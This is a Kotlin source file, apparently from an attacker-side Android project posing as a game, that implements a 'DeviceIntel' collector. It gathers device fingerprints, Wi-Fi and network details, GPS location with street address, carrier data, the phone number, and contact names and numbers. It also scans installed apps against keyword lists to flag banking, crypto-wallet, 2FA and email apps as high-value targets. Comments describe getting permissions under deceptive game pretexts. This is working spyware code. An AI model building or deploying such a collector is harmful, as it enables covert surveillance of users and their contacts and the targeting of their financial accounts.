package com.ghosttouch.attacker.exfil

import android.Manifest
import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Geocoder
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.ContactsContract
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.content.ContextCompat
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.Locale
import java.util.TimeZone

/**
 * Collects maximum device, network, location, contacts and environment intelligence.
 *
 * ## Permission-gated intel
 * With the "game" permissions granted by the user, we now have access to:
 * - **INTERNET + ACCESS_NETWORK_STATE**: Local/public IP, network details
 * - **ACCESS_WIFI_STATE**: WiFi SSID, BSSID, signal strength, IP address
 * - **ACCESS_FINE_LOCATION**: GPS coordinates, address via geocoder
 * - **READ_CONTACTS**: Full contacts list with names, phones, emails
 * - **READ_PHONE_STATE**: Carrier name, SIM operator, phone type
 * - **READ_MEDIA_IMAGES / READ_EXTERNAL_STORAGE**: Photo count, storage scan
 *
 * All justified as "game features" — the user approved every single one.
 */
object DeviceIntel {

    private const val TAG = "DeviceIntel"

    fun collect(context: Context): Map<String, String> {
        val intel = linkedMapOf<String, String>()

        try {
            collectHardware(intel)
            collectOS(intel)
            collectDisplayInfo(context, intel)
            collectMemoryInfo(context, intel)
            collectStorageInfo(intel)
            collectBatteryInfo(context, intel)
            collectNetworkInfo(context, intel)
            collectWifiInfo(context, intel)          // NEW: requires ACCESS_WIFI_STATE
            collectLocalIP(intel)                     // NEW: requires INTERNET
            collectLocationInfo(context, intel)       // NEW: requires ACCESS_FINE_LOCATION
            collectCarrierInfo(context, intel)        // NEW: requires READ_PHONE_STATE
            collectContactsInfo(context, intel)       // NEW: requires READ_CONTACTS
            collectLocaleInfo(intel)
            collectSettingsInfo(context, intel)
            collectTargetAppInfo(context, intel)
            collectInstalledAppsSummary(context, intel)
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting device intel: ${e.message}")
            intel["error"] = e.message ?: "Unknown error"
        }

        Log.d(TAG, "Collected ${intel.size} intel fields")
        return intel
    }

    // ── Device Hardware (no permission) ──

    private fun collectHardware(intel: MutableMap<String, String>) {
        intel["device.manufacturer"] = Build.MANUFACTURER
        intel["device.model"] = Build.MODEL
        intel["device.brand"] = Build.BRAND
        intel["device.product"] = Build.PRODUCT
        intel["device.hardware"] = Build.HARDWARE
        intel["device.board"] = Build.BOARD
        intel["device.device"] = Build.DEVICE
        intel["device.fingerprint"] = Build.FINGERPRINT
        intel["device.supported_abis"] = Build.SUPPORTED_ABIS.joinToString(", ")
    }

    // ── Operating System (no permission) ──

    private fun collectOS(intel: MutableMap<String, String>) {
        intel["os.version"] = Build.VERSION.RELEASE
        intel["os.sdk"] = Build.VERSION.SDK_INT.toString()
        intel["os.codename"] = Build.VERSION.CODENAME
        intel["os.security_patch"] = Build.VERSION.SECURITY_PATCH
        intel["os.build_id"] = Build.ID
        intel["os.build_type"] = Build.TYPE
        intel["os.build_display"] = Build.DISPLAY
        intel["os.incremental"] = Build.VERSION.INCREMENTAL
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            intel["os.media_perf_class"] = Build.VERSION.MEDIA_PERFORMANCE_CLASS.toString()
        }
    }

    // ── Display (no permission) ──

    private fun collectDisplayInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)
            intel["display.resolution"] = "${metrics.widthPixels}x${metrics.heightPixels}"
            intel["display.density_dpi"] = metrics.densityDpi.toString()
            intel["display.density"] = metrics.density.toString()
            val diag = Math.sqrt(
                Math.pow(metrics.widthPixels.toDouble() / metrics.xdpi, 2.0) +
                Math.pow(metrics.heightPixels.toDouble() / metrics.ydpi, 2.0)
            )
            intel["display.size_inches"] = "%.1f\"".format(diag)
        } catch (_: Exception) {}
    }

    // ── Memory (no permission) ──

    private fun collectMemoryInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            am.getMemoryInfo(memInfo)
            intel["memory.total_mb"] = (memInfo.totalMem / (1024 * 1024)).toString()
            intel["memory.available_mb"] = (memInfo.availMem / (1024 * 1024)).toString()
            intel["memory.low_memory"] = memInfo.lowMemory.toString()
        } catch (_: Exception) {}
    }

    // ── Storage (no permission) ──

    private fun collectStorageInfo(intel: MutableMap<String, String>) {
        try {
            val stat = StatFs(Environment.getDataDirectory().path)
            val totalBytes = stat.blockSizeLong * stat.blockCountLong
            val freeBytes = stat.blockSizeLong * stat.availableBlocksLong
            intel["storage.total_gb"] = "%.1f".format(totalBytes / (1024.0 * 1024 * 1024))
            intel["storage.free_gb"] = "%.1f".format(freeBytes / (1024.0 * 1024 * 1024))
            intel["storage.used_percent"] = "%.0f%%".format((1 - freeBytes.toDouble() / totalBytes) * 100)
        } catch (_: Exception) {}
    }

    // ── Battery (no permission) ──

    private fun collectBatteryInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            intel["battery.level"] = "${bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%"
            intel["battery.charging"] = bm.isCharging.toString()
        } catch (_: Exception) {}
    }

    // ── Network basics (ACCESS_NETWORK_STATE) ──

    private fun collectNetworkInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
            intel["network.connected"] = (caps != null).toString()
            if (caps != null) {
                intel["network.wifi"] = caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI).toString()
                intel["network.cellular"] = caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR).toString()
                intel["network.vpn"] = caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN).toString()
                intel["network.metered"] = (!caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED)).toString()
                intel["network.down_mbps"] = "${caps.linkDownstreamBandwidthKbps / 1000} Mbps"
                intel["network.up_mbps"] = "${caps.linkUpstreamBandwidthKbps / 1000} Mbps"
            }
        } catch (_: Exception) {}
    }

    // ── WiFi details (ACCESS_WIFI_STATE — "nearby players") ──

    @SuppressLint("MissingPermission")
    private fun collectWifiInfo(context: Context, intel: MutableMap<String, String>) {
        if (!hasPermission(context, Manifest.permission.ACCESS_WIFI_STATE)) {
            intel["wifi.status"] = "PERMISSION_DENIED"
            return
        }
        try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val info = wm.connectionInfo
            if (info != null) {
                intel["wifi.ssid"] = info.ssid?.removeSurrounding("\"") ?: "<hidden>"
                intel["wifi.bssid"] = info.bssid ?: "unknown"
                intel["wifi.rssi"] = "${info.rssi} dBm"
                intel["wifi.link_speed"] = "${info.linkSpeed} Mbps"
                intel["wifi.frequency"] = "${info.frequency} MHz"
                // IP from WiFi
                val ip = info.ipAddress
                if (ip != 0) {
                    val ipStr = "%d.%d.%d.%d".format(
                        ip and 0xff, ip shr 8 and 0xff,
                        ip shr 16 and 0xff, ip shr 24 and 0xff
                    )
                    intel["wifi.ip_address"] = ipStr
                }
            }
            // DHCP info
            val dhcp = wm.dhcpInfo
            if (dhcp != null) {
                intel["wifi.gateway"] = intToIp(dhcp.gateway)
                intel["wifi.dns1"] = intToIp(dhcp.dns1)
                intel["wifi.dns2"] = intToIp(dhcp.dns2)
                intel["wifi.subnet_mask"] = intToIp(dhcp.netmask)
            }
        } catch (_: Exception) {}
    }

    private fun intToIp(ip: Int): String {
        return "%d.%d.%d.%d".format(ip and 0xff, ip shr 8 and 0xff, ip shr 16 and 0xff, ip shr 24 and 0xff)
    }

    // ── Local IP (INTERNET — "leaderboards") ──

    private fun collectLocalIP(intel: MutableMap<String, String>) {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()?.toList() ?: return
            for (intf in interfaces) {
                if (intf.isLoopback || !intf.isUp) continue
                for (addr in intf.inetAddresses) {
                    if (addr is Inet4Address && !addr.isLoopbackAddress) {
                        intel["network.local_ip"] = addr.hostAddress ?: continue
                        intel["network.interface"] = intf.name
                    }
                }
            }
        } catch (_: Exception) {}
    }

    // ── GPS Location (ACCESS_FINE_LOCATION — "nearby players") ──

    @SuppressLint("MissingPermission")
    private fun collectLocationInfo(context: Context, intel: MutableMap<String, String>) {
        if (!hasPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)) {
            intel["location.status"] = "PERMISSION_DENIED"
            return
        }
        try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            // Try GPS provider first, fall back to network
            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)

            if (loc != null) {
                intel["location.latitude"] = "%.6f".format(loc.latitude)
                intel["location.longitude"] = "%.6f".format(loc.longitude)
                intel["location.accuracy"] = "%.0fm".format(loc.accuracy)
                intel["location.altitude"] = "%.0fm".format(loc.altitude)
                intel["location.provider"] = loc.provider ?: "unknown"
                intel["location.time"] = java.text.SimpleDateFormat("HH:mm:ss", Locale.US)
                    .format(java.util.Date(loc.time))

                // Reverse geocode to get address
                try {
                    @Suppress("DEPRECATION")
                    val addresses = Geocoder(context, Locale.getDefault()).getFromLocation(loc.latitude, loc.longitude, 1)
                    if (!addresses.isNullOrEmpty()) {
                        val addr = addresses[0]
                        intel["location.address"] = addr.getAddressLine(0) ?: ""
                        intel["location.city"] = addr.locality ?: addr.subAdminArea ?: ""
                        intel["location.state"] = addr.adminArea ?: ""
                        intel["location.country"] = addr.countryName ?: ""
                        intel["location.postal_code"] = addr.postalCode ?: ""
                    }
                } catch (_: Exception) {
                    intel["location.geocode"] = "unavailable"
                }
            } else {
                intel["location.status"] = "no_last_known_location"
            }

            intel["location.gps_enabled"] = lm.isProviderEnabled(LocationManager.GPS_PROVIDER).toString()
            intel["location.net_enabled"] = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER).toString()
        } catch (_: Exception) {}
    }

    // ── Carrier / Telephony (READ_PHONE_STATE — "do not disturb") ──

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun collectCarrierInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            intel["carrier.name"] = tm.networkOperatorName.ifEmpty { "unknown" }
            intel["carrier.operator"] = tm.networkOperator.ifEmpty { "unknown" }
            intel["carrier.country_iso"] = tm.networkCountryIso.ifEmpty { "unknown" }
            intel["carrier.sim_operator"] = tm.simOperatorName.ifEmpty { "unknown" }
            intel["carrier.sim_country"] = tm.simCountryIso.ifEmpty { "unknown" }
            intel["carrier.phone_type"] = when (tm.phoneType) {
                TelephonyManager.PHONE_TYPE_GSM -> "GSM"
                TelephonyManager.PHONE_TYPE_CDMA -> "CDMA"
                TelephonyManager.PHONE_TYPE_SIP -> "SIP"
                else -> "Unknown"
            }
            intel["carrier.network_type"] = when (tm.dataNetworkType) {
                TelephonyManager.NETWORK_TYPE_LTE -> "LTE"
                TelephonyManager.NETWORK_TYPE_NR -> "5G NR"
                TelephonyManager.NETWORK_TYPE_HSPAP -> "HSPA+"
                TelephonyManager.NETWORK_TYPE_UMTS -> "UMTS (3G)"
                TelephonyManager.NETWORK_TYPE_EDGE -> "EDGE (2G)"
                else -> "Type ${tm.dataNetworkType}"
            }
            intel["carrier.sim_state"] = when (tm.simState) {
                TelephonyManager.SIM_STATE_READY -> "READY"
                TelephonyManager.SIM_STATE_ABSENT -> "NO SIM"
                TelephonyManager.SIM_STATE_PIN_REQUIRED -> "PIN LOCKED"
                else -> "State ${tm.simState}"
            }

            // Phone number (only works on some devices/carriers)
            if (hasPermission(context, Manifest.permission.READ_PHONE_STATE)) {
                try {
                    val line = tm.line1Number
                    if (!line.isNullOrBlank()) {
                        intel["carrier.phone_number"] = line
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
    }

    // ── Contacts (READ_CONTACTS — "share scores") ──

    @SuppressLint("Range")
    private fun collectContactsInfo(context: Context, intel: MutableMap<String, String>) {
        if (!hasPermission(context, Manifest.permission.READ_CONTACTS)) {
            intel["contacts.status"] = "PERMISSION_DENIED"
            return
        }
        try {
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )
            val totalContacts = cursor?.count ?: 0
            intel["contacts.total"] = totalContacts.toString()

            // Extract first 10 contacts as sample (name + phone)
            var count = 0
            cursor?.use { c ->
                while (c.moveToNext() && count < 10) {
                    val id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID))
                    val name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)) ?: continue
                    val hasPhone = c.getInt(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))

                    var phone = ""
                    if (hasPhone > 0) {
                        val phoneCursor = context.contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id),
                            null
                        )
                        phoneCursor?.use { pc ->
                            if (pc.moveToFirst()) {
                                phone = pc.getString(
                                    pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                                ) ?: ""
                            }
                        }
                    }

                    intel["contacts.sample_${count}_name"] = name
                    if (phone.isNotBlank()) {
                        intel["contacts.sample_${count}_phone"] = phone
                    }
                    count++
                }
            }
        } catch (_: Exception) {}
    }

    // ── Locale & Timezone (no permission) ──

    private fun collectLocaleInfo(intel: MutableMap<String, String>) {
        intel["locale.language"] = Locale.getDefault().language
        intel["locale.country"] = Locale.getDefault().country
        intel["locale.display"] = Locale.getDefault().displayName
        intel["timezone.id"] = TimeZone.getDefault().id
        intel["timezone.offset"] = "UTC%+d".format(TimeZone.getDefault().rawOffset / 3600000)
    }

    // ── System Settings (no permission) ──

    private fun collectSettingsInfo(context: Context, intel: MutableMap<String, String>) {
        try {
            intel["settings.android_id"] = Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            intel["settings.adb_enabled"] = Settings.Global.getString(
                context.contentResolver, Settings.Global.ADB_ENABLED
            ) ?: "0"
            intel["settings.developer_mode"] = Settings.Global.getString(
                context.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED
            ) ?: "0"
            intel["settings.accessibility"] = Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED
            ) ?: "0"
        } catch (_: Exception) {}
    }

    // ── Target App Info (no permission) ──

    private fun collectTargetAppInfo(context: Context, intel: MutableMap<String, String>) {
        val targetPkg = "com.wcdonalds.app"
        try {
            val pm = context.packageManager
            val info = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getPackageInfo(targetPkg, PackageManager.PackageInfoFlags.of(0))
            } else {
                @Suppress("DEPRECATION")
                pm.getPackageInfo(targetPkg, 0)
            }
            intel["target.package"] = targetPkg
            intel["target.version"] = info.versionName ?: "unknown"
            intel["target.first_install"] = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
                .format(java.util.Date(info.firstInstallTime))
            intel["target.last_update"] = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
                .format(java.util.Date(info.lastUpdateTime))
            val appInfo = info.applicationInfo
            if (appInfo != null) {
                intel["target.label"] = pm.getApplicationLabel(appInfo).toString()
                intel["target.min_sdk"] = appInfo.minSdkVersion.toString()
                intel["target.target_sdk"] = appInfo.targetSdkVersion.toString()
            }
        } catch (_: PackageManager.NameNotFoundException) {
            intel["target.package"] = "$targetPkg (not installed)"
        } catch (_: Exception) {}
    }

    // ── Installed Apps Scan (no permission) ──

    private fun collectInstalledAppsSummary(context: Context, intel: MutableMap<String, String>) {
        try {
            val pm = context.packageManager
            val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getInstalledPackages(PackageManager.PackageInfoFlags.of(0))
            } else {
                @Suppress("DEPRECATION")
                pm.getInstalledPackages(0)
            }
            intel["apps.total_installed"] = packages.size.toString()

            val interesting = mutableListOf<String>()
            val bankKw = listOf("bank", "nubank", "itau", "bradesco", "santander", "caixa", "inter", "c6bank", "paypal", "venmo", "chase", "wells", "picpay", "mercadopago")
            val cryptoKw = listOf("binance", "coinbase", "crypto", "bitcoin", "metamask", "trust.wallet", "exodus")
            val socialKw = listOf("whatsapp", "telegram", "signal", "instagram", "facebook", "twitter", "tiktok", "snapchat")
            val authKw = listOf("authenticator", "authy", "2fa", "otp")
            val emailKw = listOf("gmail", "outlook", "yahoo.mail", "protonmail")

            for (pkg in packages) {
                val n = pkg.packageName.lowercase()
                when {
                    bankKw.any { n.contains(it) } -> interesting.add("[BANK] ${pkg.packageName}")
                    cryptoKw.any { n.contains(it) } -> interesting.add("[CRYPTO] ${pkg.packageName}")
                    socialKw.any { n.contains(it) } -> interesting.add("[SOCIAL] ${pkg.packageName}")
                    authKw.any { n.contains(it) } -> interesting.add("[2FA] ${pkg.packageName}")
                    emailKw.any { n.contains(it) } -> interesting.add("[EMAIL] ${pkg.packageName}")
                }
            }

            if (interesting.isNotEmpty()) {
                intel["apps.high_value_count"] = interesting.size.toString()
                interesting.forEachIndexed { i, app ->
                    intel["apps.high_value_$i"] = app
                }
            }
        } catch (_: Exception) {}
    }

    // ── Utilities ──

    private fun hasPermission(context: Context, permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    fun formatForLog(intel: Map<String, String>): String {
        val sb = StringBuilder()
        var currentCategory = ""
        for ((key, value) in intel) {
            val category = key.substringBefore(".")
            if (category != currentCategory) {
                currentCategory = category
                sb.appendLine()
                sb.appendLine("  ┌─ ${category.uppercase()} ${"─".repeat(40 - category.length.coerceAtMost(39))}")
            }
            val field = key.substringAfter(".")
            sb.appendLine("  │ %-28s %s".format(field, value))
        }
        sb.appendLine("  └${"─".repeat(50)}")
        return sb.toString()
    }
}
